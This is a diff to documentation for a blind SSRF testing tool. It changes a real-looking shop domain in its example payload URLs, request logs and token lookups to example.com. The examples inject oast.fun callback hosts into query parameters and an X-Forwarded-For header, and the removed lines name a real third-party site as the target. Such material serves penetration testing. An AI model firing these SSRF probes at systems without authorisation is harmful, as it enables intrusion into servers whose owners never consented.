@@ -80,8 +80,8 @@ One URL per matched endpoint.
 
 Example:
 
-https://absupplies.chitchats.com/account/login?checkout_url=http://a7d91cfb1203.oast.fun
-https://absupplies.chitchats.com/collections/mailer-bundles?page=http://fe119cb2d991.oast.fun
+https://absupplies.example.com/account/login?checkout_url=http://a7d91cfb1203.oast.fun
+https://absupplies.example.com/collections/mailer-bundles?page=http://fe119cb2d991.oast.fun
 
 3) sent_requests.log
 
@@ -94,16 +94,16 @@ timestamp   token   payload_host   target   meta   http_code
 
 Example:
 
-2025-11-20T12:34:57  a7d91cfb1203  a7d91cfb1203.oast.fun  https://absupplies.chitchats.com/...   PARAM   200
-2025-11-20T12:35:22  b8e21adc7789  b8e21adc7789.oast.fun  https://absupplies.chitchats.com      HEADER:X-Forwarded-For   200
+2025-11-20T12:34:57  a7d91cfb1203  a7d91cfb1203.oast.fun  https://absupplies.example.com/...   PARAM   200
+2025-11-20T12:35:22  b8e21adc7789  b8e21adc7789.oast.fun  https://absupplies.example.com      HEADER:X-Forwarded-For   200
 
 🌍 REALISTIC FULL WORKING EXAMPLE
 
 Your input: ssrf.txt
 
-https://absupplies.chitchats.com/account/login?checkout_url=/
-https://absupplies.chitchats.com/collections/mailer-bundles?page=2
-https://absupplies.chitchats.com/sitemap_products_1.xml?from=100&to=200
+https://absupplies.example.com/account/login?checkout_url=/
+https://absupplies.example.com/collections/mailer-bundles?page=2
+https://absupplies.example.com/sitemap_products_1.xml?from=100&to=200
 
 
 Your ssrf_headers.txt:
@@ -147,8 +147,8 @@ fe119cb2d991   # page
 
 param_tests.txt
 
-https://absupplies.chitchats.com/account/login?checkout_url=http://a7d91cfb1203.oast.fun
-https://absupplies.chitchats.com/collections/mailer-bundles?page=http://fe119cb2d991.oast.fun
+https://absupplies.example.com/account/login?checkout_url=http://a7d91cfb1203.oast.fun
+https://absupplies.example.com/collections/mailer-bundles?page=http://fe119cb2d991.oast.fun
 
 
 The script sends them.
@@ -213,12 +213,12 @@ grep b8e21adc7789 ssrf_blinder_minimal_out/tokens_map.tsv
 
 Output:
 
-b8e21adc7789  b8e21adc7789.oast.fun  HEADER  absupplies.chitchats.com  HEADER:X-Forwarded-For
+b8e21adc7789  b8e21adc7789.oast.fun  HEADER  absupplies.example.com  HEADER:X-Forwarded-For
 
 ANSWER:
 
 X-Forwarded-For header caused the SSRF
-Target: https://absupplies.chitchats.com
+Target: https://absupplies.example.com
 
 This is exact identification.
 
@@ -228,7 +228,7 @@ grep b8e21adc7789 ssrf_blinder_minimal_out/sent_requests.log
 
 Output:
 
-2025-11-20T12:35:22  b8e21adc7789  b8e21adc7789.oast.fun  https://absupplies.chitchats.com  HEADER:X-Forwarded-For  200
+2025-11-20T12:35:22  b8e21adc7789  b8e21adc7789.oast.fun  https://absupplies.example.com  HEADER:X-Forwarded-For  200
 
 ⭐ FINAL SUMMARY (short version)
 ✔ Param fuzz:
